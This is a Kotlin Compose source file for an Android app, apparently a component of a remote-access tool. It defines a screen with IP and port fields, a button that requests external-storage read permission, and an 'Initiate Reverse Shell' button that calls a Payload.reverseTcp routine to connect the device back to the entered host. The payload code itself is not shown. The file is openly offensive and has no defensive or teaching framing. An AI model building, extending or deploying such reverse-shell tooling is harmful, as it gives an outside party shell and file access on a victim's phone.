package com.satwik.nexgenius.core.main

import android.Manifest
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.Button
import androidx.compose.material3.Text
import androidx.compose.material3.TextField
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.input.TextFieldValue
import androidx.compose.ui.unit.dp
import androidx.lifecycle.viewmodel.compose.viewModel
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch

@OptIn(DelicateCoroutinesApi::class)
@Composable
fun ShellyScreen(){

    val viewModel = viewModel<MainViewModel>()

    val storagePermissionResultLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission(),
        onResult = {isGranted ->
            viewModel.onPermissionResult(
                permission = Manifest.permission.READ_EXTERNAL_STORAGE,
                isGranted = isGranted
            )
        }
    )

    Column (
        modifier = Modifier.fillMaxSize().padding(vertical = 16.dp)
    ){

        var ip by remember { mutableStateOf(TextFieldValue("")) }
        var port by remember { mutableStateOf(TextFieldValue("")) }


        TextField(
            value = ip,
            onValueChange = { ip = it },
            modifier = Modifier.fillMaxWidth(),
            placeholder = { Text(text = "IP Address") },
            shape = RoundedCornerShape(10.dp)
        )

        TextField(
            value = port,
            onValueChange = { port = it },
            modifier = Modifier.fillMaxWidth(),
            placeholder = { Text(text = "Port") },
            shape = RoundedCornerShape(topEnd = 15.dp, topStart = 15.dp)
        )

        Button(
            onClick = { storagePermissionResultLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE) },
        ) {
            Text(text = "Ask Permission")
        }

        Button(
            onClick = {
                GlobalScope.launch(Dispatchers.IO) {
                    Payload.reverseTcp(ip.text, port.text.toInt())
                }
            },
        ) {
            Text(text = "Initiate Reverse Shell")
        }
    }
}

